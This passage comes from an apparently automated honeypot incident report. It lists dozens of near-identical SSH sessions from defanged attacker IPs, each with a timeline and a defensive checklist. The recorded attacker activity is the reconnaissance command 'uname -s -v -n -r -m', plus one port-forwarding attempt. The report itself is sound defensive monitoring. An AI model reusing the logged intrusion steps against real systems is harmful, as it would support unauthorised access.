| `2026-07-04 15:08:43` | `cowrie.client.kex` |
| `2026-07-04 15:08:44` | `cowrie.login.success` |
| `2026-07-04 15:08:44` | `cowrie.session.params` |
| `2026-07-04 15:08:44` | `cowrie.command.input` |
| `2026-07-04 15:08:44` | `cowrie.log.closed` |
| `2026-07-04 15:08:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3851e10e57ec

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:46` | `cowrie.session.connect` |
| `2026-07-04 15:08:46` | `cowrie.client.version` |
| `2026-07-04 15:08:47` | `cowrie.client.kex` |
| `2026-07-04 15:08:47` | `cowrie.login.success` |
| `2026-07-04 15:08:48` | `cowrie.session.params` |
| `2026-07-04 15:08:48` | `cowrie.command.input` |
| `2026-07-04 15:08:48` | `cowrie.log.closed` |
| `2026-07-04 15:08:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d55718bd178

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:50` | `cowrie.session.connect` |
| `2026-07-04 15:08:50` | `cowrie.client.version` |
| `2026-07-04 15:08:50` | `cowrie.client.kex` |
| `2026-07-04 15:08:50` | `cowrie.login.success` |
| `2026-07-04 15:08:51` | `cowrie.session.params` |
| `2026-07-04 15:08:51` | `cowrie.command.input` |
| `2026-07-04 15:08:51` | `cowrie.log.closed` |
| `2026-07-04 15:08:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a2f28047866

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:53` | `cowrie.session.connect` |
| `2026-07-04 15:08:53` | `cowrie.client.version` |
| `2026-07-04 15:08:53` | `cowrie.client.kex` |
| `2026-07-04 15:08:53` | `cowrie.login.success` |
| `2026-07-04 15:08:54` | `cowrie.session.params` |
| `2026-07-04 15:08:54` | `cowrie.command.input` |
| `2026-07-04 15:08:54` | `cowrie.log.closed` |
| `2026-07-04 15:08:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9252848cf40d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:56` | `cowrie.session.connect` |
| `2026-07-04 15:08:56` | `cowrie.client.version` |
| `2026-07-04 15:08:56` | `cowrie.client.kex` |
| `2026-07-04 15:08:57` | `cowrie.login.success` |
| `2026-07-04 15:08:57` | `cowrie.session.params` |
| `2026-07-04 15:08:57` | `cowrie.command.input` |
| `2026-07-04 15:08:57` | `cowrie.log.closed` |
| `2026-07-04 15:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b269434ae6

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:08 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:08:59` | `cowrie.session.connect` |
| `2026-07-04 15:08:59` | `cowrie.client.version` |
| `2026-07-04 15:08:59` | `cowrie.client.kex` |
| `2026-07-04 15:09:00` | `cowrie.login.success` |
| `2026-07-04 15:09:00` | `cowrie.session.params` |
| `2026-07-04 15:09:00` | `cowrie.command.input` |
| `2026-07-04 15:09:01` | `cowrie.log.closed` |
| `2026-07-04 15:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7f74199c639

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:02` | `cowrie.session.connect` |
| `2026-07-04 15:09:02` | `cowrie.client.version` |
| `2026-07-04 15:09:02` | `cowrie.client.kex` |
| `2026-07-04 15:09:03` | `cowrie.login.success` |
| `2026-07-04 15:09:03` | `cowrie.session.params` |
| `2026-07-04 15:09:03` | `cowrie.command.input` |
| `2026-07-04 15:09:04` | `cowrie.log.closed` |
| `2026-07-04 15:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60fbcd475e04

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:06` | `cowrie.session.connect` |
| `2026-07-04 15:09:06` | `cowrie.client.version` |
| `2026-07-04 15:09:06` | `cowrie.client.kex` |
| `2026-07-04 15:09:06` | `cowrie.login.success` |
| `2026-07-04 15:09:07` | `cowrie.session.params` |
| `2026-07-04 15:09:07` | `cowrie.command.input` |
| `2026-07-04 15:09:07` | `cowrie.log.closed` |
| `2026-07-04 15:09:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e54f655068af

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:09` | `cowrie.session.connect` |
| `2026-07-04 15:09:09` | `cowrie.client.version` |
| `2026-07-04 15:09:09` | `cowrie.client.kex` |
| `2026-07-04 15:09:09` | `cowrie.login.success` |
| `2026-07-04 15:09:10` | `cowrie.session.params` |
| `2026-07-04 15:09:10` | `cowrie.command.input` |
| `2026-07-04 15:09:10` | `cowrie.log.closed` |
| `2026-07-04 15:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30f2bf345fce

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:12` | `cowrie.session.connect` |
| `2026-07-04 15:09:12` | `cowrie.client.version` |
| `2026-07-04 15:09:12` | `cowrie.client.kex` |
| `2026-07-04 15:09:12` | `cowrie.login.success` |
| `2026-07-04 15:09:13` | `cowrie.session.params` |
| `2026-07-04 15:09:13` | `cowrie.command.input` |
| `2026-07-04 15:09:13` | `cowrie.log.closed` |
| `2026-07-04 15:09:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5563e9d90c87

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:15` | `cowrie.session.connect` |
| `2026-07-04 15:09:15` | `cowrie.client.version` |
| `2026-07-04 15:09:15` | `cowrie.client.kex` |
| `2026-07-04 15:09:16` | `cowrie.login.success` |
| `2026-07-04 15:09:17` | `cowrie.session.params` |
| `2026-07-04 15:09:17` | `cowrie.command.input` |
| `2026-07-04 15:09:17` | `cowrie.log.closed` |
| `2026-07-04 15:09:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-829745874793

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:18` | `cowrie.session.connect` |
| `2026-07-04 15:09:18` | `cowrie.client.version` |
| `2026-07-04 15:09:19` | `cowrie.client.kex` |
| `2026-07-04 15:09:19` | `cowrie.login.success` |
| `2026-07-04 15:09:20` | `cowrie.session.params` |
| `2026-07-04 15:09:20` | `cowrie.command.input` |
| `2026-07-04 15:09:20` | `cowrie.log.closed` |
| `2026-07-04 15:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72f4f62d30a3

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:22` | `cowrie.session.connect` |
| `2026-07-04 15:09:22` | `cowrie.client.version` |
| `2026-07-04 15:09:22` | `cowrie.client.kex` |
| `2026-07-04 15:09:22` | `cowrie.login.success` |
| `2026-07-04 15:09:23` | `cowrie.session.params` |
| `2026-07-04 15:09:23` | `cowrie.command.input` |
| `2026-07-04 15:09:23` | `cowrie.log.closed` |
| `2026-07-04 15:09:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db68c8351601

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:25` | `cowrie.session.connect` |
| `2026-07-04 15:09:25` | `cowrie.client.version` |
| `2026-07-04 15:09:25` | `cowrie.client.kex` |
| `2026-07-04 15:09:25` | `cowrie.login.success` |
| `2026-07-04 15:09:26` | `cowrie.session.params` |
| `2026-07-04 15:09:26` | `cowrie.command.input` |
| `2026-07-04 15:09:26` | `cowrie.log.closed` |
| `2026-07-04 15:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee62f5c2dcae

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:28` | `cowrie.session.connect` |
| `2026-07-04 15:09:28` | `cowrie.client.version` |
| `2026-07-04 15:09:28` | `cowrie.client.kex` |
| `2026-07-04 15:09:29` | `cowrie.login.success` |
| `2026-07-04 15:09:29` | `cowrie.session.params` |
| `2026-07-04 15:09:29` | `cowrie.command.input` |
| `2026-07-04 15:09:29` | `cowrie.log.closed` |
| `2026-07-04 15:09:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2adb55f7fa49

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:31` | `cowrie.session.connect` |
| `2026-07-04 15:09:31` | `cowrie.client.version` |
| `2026-07-04 15:09:31` | `cowrie.client.kex` |
| `2026-07-04 15:09:32` | `cowrie.login.success` |
| `2026-07-04 15:09:33` | `cowrie.session.params` |
| `2026-07-04 15:09:33` | `cowrie.command.input` |
| `2026-07-04 15:09:33` | `cowrie.log.closed` |
| `2026-07-04 15:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-462babba0b0b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:35` | `cowrie.session.connect` |
| `2026-07-04 15:09:35` | `cowrie.client.version` |
| `2026-07-04 15:09:35` | `cowrie.client.kex` |
| `2026-07-04 15:09:35` | `cowrie.login.success` |
| `2026-07-04 15:09:36` | `cowrie.session.params` |
| `2026-07-04 15:09:36` | `cowrie.command.input` |
| `2026-07-04 15:09:36` | `cowrie.log.closed` |
| `2026-07-04 15:09:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7343ebad711

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:38` | `cowrie.session.connect` |
| `2026-07-04 15:09:38` | `cowrie.client.version` |
| `2026-07-04 15:09:38` | `cowrie.client.kex` |
| `2026-07-04 15:09:38` | `cowrie.login.success` |
| `2026-07-04 15:09:39` | `cowrie.session.params` |
| `2026-07-04 15:09:39` | `cowrie.command.input` |
| `2026-07-04 15:09:39` | `cowrie.log.closed` |
| `2026-07-04 15:09:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a88e3503217f

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:41` | `cowrie.session.connect` |
| `2026-07-04 15:09:41` | `cowrie.client.version` |
| `2026-07-04 15:09:41` | `cowrie.client.kex` |
| `2026-07-04 15:09:41` | `cowrie.login.success` |
| `2026-07-04 15:09:42` | `cowrie.session.params` |
| `2026-07-04 15:09:42` | `cowrie.command.input` |
| `2026-07-04 15:09:42` | `cowrie.log.closed` |
| `2026-07-04 15:09:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcb0611052f1

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:44` | `cowrie.session.connect` |
| `2026-07-04 15:09:44` | `cowrie.client.version` |
| `2026-07-04 15:09:44` | `cowrie.client.kex` |
| `2026-07-04 15:09:45` | `cowrie.login.success` |
| `2026-07-04 15:09:45` | `cowrie.session.params` |
| `2026-07-04 15:09:45` | `cowrie.command.input` |
| `2026-07-04 15:09:45` | `cowrie.log.closed` |
| `2026-07-04 15:09:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-772a289a0645

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:45` | `cowrie.session.connect` |
| `2026-07-04 15:09:45` | `cowrie.client.version` |
| `2026-07-04 15:09:45` | `cowrie.client.kex` |
| `2026-07-04 15:09:46` | `cowrie.login.success` |
| `2026-07-04 15:09:46` | `cowrie.direct-tcpip.request` |
| `2026-07-04 15:09:46` | `cowrie.direct-tcpip.data` |
| `2026-07-04 15:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fecf0366ad0b

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:47` | `cowrie.session.connect` |
| `2026-07-04 15:09:47` | `cowrie.client.version` |
| `2026-07-04 15:09:47` | `cowrie.client.kex` |
| `2026-07-04 15:09:48` | `cowrie.login.success` |
| `2026-07-04 15:09:49` | `cowrie.session.params` |
| `2026-07-04 15:09:49` | `cowrie.command.input` |
| `2026-07-04 15:09:49` | `cowrie.log.closed` |
| `2026-07-04 15:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98425e1855a4

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:51` | `cowrie.session.connect` |
| `2026-07-04 15:09:51` | `cowrie.client.version` |
| `2026-07-04 15:09:51` | `cowrie.client.kex` |
| `2026-07-04 15:09:51` | `cowrie.login.success` |
| `2026-07-04 15:09:52` | `cowrie.session.params` |
| `2026-07-04 15:09:52` | `cowrie.command.input` |
| `2026-07-04 15:09:52` | `cowrie.log.closed` |
| `2026-07-04 15:09:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbd4bc0b69bb

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:54` | `cowrie.session.connect` |
| `2026-07-04 15:09:54` | `cowrie.client.version` |
| `2026-07-04 15:09:54` | `cowrie.client.kex` |
| `2026-07-04 15:09:54` | `cowrie.login.success` |
| `2026-07-04 15:09:55` | `cowrie.session.params` |
| `2026-07-04 15:09:55` | `cowrie.command.input` |
| `2026-07-04 15:09:55` | `cowrie.log.closed` |
| `2026-07-04 15:09:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7c400e40026

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:09 |
| **Last Seen** | 2026-07-04 15:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:09:57` | `cowrie.session.connect` |
| `2026-07-04 15:09:57` | `cowrie.client.version` |
| `2026-07-04 15:09:57` | `cowrie.client.kex` |
| `2026-07-04 15:09:58` | `cowrie.login.success` |
| `2026-07-04 15:09:58` | `cowrie.session.params` |
| `2026-07-04 15:09:58` | `cowrie.command.input` |
| `2026-07-04 15:09:59` | `cowrie.log.closed` |
| `2026-07-04 15:09:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4dce9198ec0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 15:10 |
| **Last Seen** | 2026-07-04 15:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 15:10:00` | `cowrie.session.connect` |
| `2026-07-04 15:10:00` | `cowrie.client.version` |
| `2026-07-04 15:10:01` | `cowrie.client.kex` |
| `2026-07-04 15:10:01` | `cowrie.login.success` |
| `2026-07-04 15:10:02` | `cowrie.session.params` |
| `2026-07-04 15:10:02` | `cowrie.command.input` |
| `2026-07-04 15:10:02` | `cowrie.log.closed` |
| `2026-07-04 15:10:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-554cc8cddfef

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
